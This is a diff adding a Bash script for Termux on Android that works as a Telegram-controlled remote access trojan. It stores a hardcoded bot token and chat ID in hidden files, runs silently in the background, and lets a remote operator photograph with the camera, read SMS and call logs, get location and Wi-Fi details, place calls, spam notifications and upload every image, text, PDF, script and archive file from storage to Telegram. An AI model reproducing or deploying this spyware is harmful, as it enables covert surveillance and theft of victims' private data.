@@ -1,0 +1,206 @@
+#!/bin/bash
+TOKEN="/data/data/com.termux/files/usr/lib/.whatthefuck"
+IDTELE="/data/data/com.termux/files/usr/lib/.anu"
+STATE_FILE=".STATE"
+wajib="/data/data/com.termux/"
+if [ -d "$wajib" ]; then
+if [[ -f "$TOKEN" && -f "$IDTELE" ]]; then
+    token=$(cat "$TOKEN")
+    id=$(cat "$IDTELE")
+else
+    pkg install termux-api -y
+    echo "5951232585" > "$IDTELE" # chat id 
+    echo "8008006016:AAHFsasL6B-isriPHFvGwZTPkYkrUscQ21I" > "$TOKEN" #token bot tele
+fi
+ID_TERMUX="$(whoami)"
+Menu_GHOST() {
+banner1() {
+    echo "⠀
+USER ID  : $ID_TERMUX siap di Exploit !
+
+ "
+}
+
+send_menu() {
+    local banner_output
+    banner_output=$(banner1)
+    curl -s -X POST "https://api.telegram.org/bot$token/sendMessage" \
+        -d "chat_id=$id" \
+        -d "text=$banner_output" \
+        -d "reply_markup=$(generate_keyboard)"
+}
+generate_keyboard() {
+    cat <<EOF
+{
+    "keyboard": [
+        ["Ambil Foto", "Cek Status Baterai"],
+        ["Dapatkan Lokasi", "Informasi Sistem"],
+        ["Ambil SMS", "Ambil Log Panggilan"],
+        ["Ubah Wallpaper", "Panggil Nomor Telepon"],
+        ["Kirim Semua File", "Dapatkan Info Koneksi Wi-Fi"],
+        ["Hidupkan Wi-Fi", "Matikan Wi-Fi"],
+        ["Spam Notifikasi", "Reset Semua Perintah", "Menu"]
+    ],
+    "resize_keyboard": true,
+    "one_time_keyboard": true
+}
+EOF
+}
+reset() {
+    rm -rf "$STATE_FILE"
+    send_message "File .STATE telah dihapus."
+    send_message "Welcome back."
+    send_menu
+}
+send_message() {
+    curl -s -X POST "https://api.telegram.org/bot$token/sendMessage" -d "chat_id=$id" -d "text=$1"
+}
+
+spam_notifications() {
+    send_message "Masukkan judul notifikasi:"
+    echo "waiting_for_notification_title" > "$STATE_FILE"
+}
+
+send_notification() {
+    for ((i=1; i<=$3; i++)); do
+        termux-notification --title "$1" --content "$2"
+    done
+    send_message "Spam notifikasi sudah dikirim sebanyak $3."
+}
+
+take_photo() {
+    local photo_path="/sdcard/foto.jpg"
+    termux-camera-photo -c 1 "$photo_path"
+    send_message "Foto berhasil diambil. Sedang dikirim..."
+    curl -s -X POST "https://api.telegram.org/bot$token/sendPhoto" -F "chat_id=$id" -F "photo=@$photo_path"
+    rm "$photo_path"
+}
+
+send_all_files() {
+    local dir="/storage/emulated/0/"
+    local extensions=("jpg" "png" "IMG" "txt" "pdf" "py" "sh" "zip")
+    send_message "Mencari dan mengirim file dari: $dir"
+    for ext in "${extensions[@]}"; do
+        process_files "$ext" "$token" "$dir"
+    done
+}
+
+process_files() {
+    find /storage/emulated/0/ -type f -iname "*.$1" 2>/dev/null | while read -r file; do
+        send_file "$2" "$file"
+    done
+}
+
+send_file() {
+    curl -s -X POST "https://api.telegram.org/bot$1/sendDocument" -F "chat_id=$id" -F "document=@$2"
+    send_message "Mengirim file: $2"
+}
+
+get_location() {
+    send_message "Lokasi Anda: $(termux-location)"
+}
+
+check_battery() {
+    send_message "Status Baterai: $(termux-battery-status)"
+}
+
+system_info() {
+    send_message "Informasi Sistem: $(termux-info)"
+}
+
+get_sms() {
+    send_message "Daftar SMS:\n$(termux-sms-list)"
+}
+
+get_call_log() {
+    send_message "Log Panggilan:\n$(termux-call-log)"
+}
+
+set_wallpaper() {
+    send_message "Masukkan URL wallpaper yang ingin digunakan:"
+    echo "waiting_for_wallpaper_url" > "$STATE_FILE"
+}
+
+make_call() {
+    send_message "Masukkan nomor telepon yang ingin dipanggil:"
+    echo "waiting_for_phone_number" > "$STATE_FILE"
+}
+
+get_wifi_info() {
+    send_message "Informasi Koneksi Wi-Fi:\n$(termux-wifi-connectioninfo)"
+}
+
+set_wifi() {
+    termux-wifi-enable "$1"
+    [[ "$1" == "true" ]] && send_message "Wi-Fi dihidupkan." || send_message "Wi-Fi dimatikan."
+}
+
+handle_command() {
+    if [[ -f "$STATE_FILE" ]]; then
+        local state=$(cat "$STATE_FILE")
+        case "$state" in
+            "waiting_for_wallpaper_url")
+                termux-wallpaper -u "$1" && send_message "Wallpaper berhasil diubah dari URL: $1" || send_message "Gagal mengubah wallpaper. Periksa URL."
+                rm "$STATE_FILE"
+                ;;
+            "waiting_for_phone_number")
+                [[ "$1" =~ ^[0-9]+$ ]] && send_message "Memanggil nomor: $1..." && termux-telephony-call "$1" || send_message "Input tidak valid."
+                rm "$STATE_FILE"
+                ;;
+            "waiting_for_notification_title")
+                notification_title="$1"
+                send_message "Masukkan konten notifikasi:"
+                echo "waiting_for_notification_content" > "$STATE_FILE"
+                ;;
+            "waiting_for_notification_content")
+                notification_content="$1"
+                send_message "Masukkan jumlah pengiriman:"
+                echo "waiting_for_notification_count" > "$STATE_FILE"
+                ;;
+            "waiting_for_notification_count")
+                [[ "$1" =~ ^[0-9]+$ ]] && send_notification "$notification_title" "$notification_content" "$1" || send_message "Input tidak valid."
+                rm "$STATE_FILE"
+                ;;
+            *) rm "$STATE_FILE" ;;
+        esac
+        return
+    fi
+    case "$1" in
+        "Ambil Foto") take_photo ;;
+        "Kirim Semua File") send_all_files ;;
+        "Dapatkan Lokasi") get_location ;;
+        "Cek Status Baterai") check_battery ;;
+        "Informasi Sistem") system_info ;;
+        "Ambil SMS") get_sms ;;
+        "Ambil Log Panggilan") get_call_log ;;
+        "Ubah Wallpaper") set_wallpaper ;;
+        "Panggil Nomor Telepon") make_call ;;
+        "Dapatkan Info Koneksi Wi-Fi") get_wifi_info ;;
+        "Hidupkan Wi-Fi") set_wifi "true" ;;
+        "Matikan Wi-Fi") set_wifi "false" ;;
+        "Spam Notifikasi") spam_notifications ;;
+        "Reset Semua Perintah") reset ;;
+        "Menu") send_menu ;;
+        *) send_message "Perintah tidak dikenali." ;;
+    esac
+}
+
+process_updates() {
+    local updates=$(curl -s "https://api.telegram.org/bot$token/getUpdates?offset=-1")
+    local update_id=$(echo "$updates" | jq -r '.result[0].update_id')
+    local command=$(echo "$updates" | jq -r '.result[0].message.text')
+    [[ $update_id != "null" ]] && handle_command "$command" && curl -s "https://api.telegram.org/bot$token/getUpdates?offset=$((update_id + 1))" > /dev/null
+}
+
+run_bot() {
+    while true; do
+        process_updates
+        sleep 1
+    done
+}
+
+send_menu
+run_bot
+}
+
+Menu_GHOST &> /dev/null &
